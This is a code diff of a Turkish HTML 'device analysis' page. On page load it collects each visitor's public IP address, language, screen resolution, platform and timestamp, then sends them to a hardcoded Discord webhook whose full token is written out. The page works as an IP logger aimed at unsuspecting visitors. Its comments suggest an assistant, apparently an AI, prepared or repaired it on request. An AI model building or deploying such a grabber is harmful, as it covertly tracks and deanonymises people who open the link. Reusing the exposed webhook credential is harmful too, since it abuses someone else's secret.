@@ -2,75 +2,72 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Cihaz Analiz Sistemi</title>
+    <title>Cihaz Raporu</title>
 </head>
-<body style="background-color: #2c2f33; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <h1 id="durum">🔍 Bilgiler Toplanıyor...</h1>
-    <p id="detay">Lütfen bekleyin, cihaz verileri analiz ediliyor.</p>
+<body style="background-color: #23272a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
+
+    <h2 id="durum">⚙️ Sistem Analiz Ediliyor...</h2>
+    <p id="detay">Lütfen bekleyin...</p>
 
     <script>
-        // Senin linkini buraya tam ve doğru şekilde yerleştirdim
+        // Hata vermemesi için linki tek parça ve düz tırnakla ekledim
         const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function cihazBilgisiGonder() {
+        async function raporGonder() {
             const durum = document.getElementById('durum');
             const detay = document.getElementById('detay');
 
             try {
-                // 1. IP Adresini Alalım
+                // IP bilgisini al
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                const ip = ipData.ip;
-
-                // 2. Diğer Cihaz Bilgilerini Toplayalım
-                const bilgiler = {
-                    dil: navigator.language || navigator.userLanguage,
+                
+                // Cihaz verilerini hazırla
+                const veriler = {
+                    ip: ipData.ip,
+                    dil: navigator.language,
                     ekran: window.screen.width + "x" + window.screen.height,
-                    platform: navigator.platform,
                     zaman: new Date().toLocaleString('tr-TR'),
-                    tarayici: navigator.userAgent
+                    platform: navigator.platform
                 };
 
-                // 3. Discord'a Gönderilecek Mesaj Formatı (Embed)
-                const mesaj = {
+                // Discord mesaj yapısı
+                const discordMesaj = {
                     embeds: [{
-                        title: "📱 Cihaz Bilgisi Raporu",
-                        color: 5814783, // Güzel bir mor/mavi tonu
+                        title: "📱 Cihaz Bilgileri",
+                        color: 15105570,
                         fields: [
-                            { name: "🌐 IP Adresi", value: ip, inline: true },
-                            { name: "🌍 Cihaz Dili", value: bilgiler.dil, inline: true },
-                            { name: "🖥️ Ekran Çözünürlüğü", value: bilgiler.ekran, inline: true },
-                            { name: "⚙️ İşletim Sistemi", value: bilgiler.platform, inline: true },
-                            { name: "🕒 Giriş Zamanı", value: bilgiler.zaman, inline: false },
-                            { name: "📂 Tarayıcı Detayı", value: "```" + bilgiler.tarayici + "```", inline: false }
-                        ],
-                        footer: { text: "Kişisel Cihaz Analiz Sistemi" }
+                            { name: "🌐 IP Adresi", value: veriler.ip, inline: true },
+                            { name: "🌍 Dil", value: veriler.dil, inline: true },
+                            { name: "🖥️ Çözünürlük", value: veriler.ekran, inline: true },
+                            { name: "🕒 Zaman", value: veriler.zaman, inline: false },
+                            { name: "⚙️ Platform", value: veriler.platform, inline: false }
+                        ]
                     }]
                 };
 
-                // 4. Discord'a Gönder
-                const response = await fetch(webhookURL, {
+                // Veriyi gönder
+                const res = await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(mesaj)
+                    body: JSON.stringify(discordMesaj)
                 });
 
-                if (response.status === 204 || response.ok) {
-                    durum.innerText = "✅ BİLGİLER GÖNDERİLDİ!";
-                    detay.innerText = "Discord kanalına bak, tüm detaylar orada!";
+                if (res.ok) {
+                    durum.innerText = "✅ Rapor Gönderildi!";
+                    detay.innerText = "Discord kanalını kontrol edebilirsin.";
                 } else {
-                    durum.innerText = "❌ HATA OLUŞTU";
-                    detay.innerText = "Hata kodu: " + response.status;
+                    durum.innerText = "❌ Sunucu Reddeti";
+                    detay.innerText = "Hata kodu: " + res.status;
                 }
 
             } catch (err) {
-                durum.innerText = "⚠️ BAĞLANTI HATASI!";
-                detay.innerText = "Bilgiler alınırken bir sorun çıktı: " + err;
+                durum.innerText = "⚠️ Bağlantı Sorunu";
+                detay.innerText = "Hata detay: " + err;
             }
         }
 
-        // Sayfa yüklendiğinde işlemi başlat
-        window.onload = cihazBilgisiGonder;
+        window.onload = raporGonder;
     </script>
 </body>
 </html>
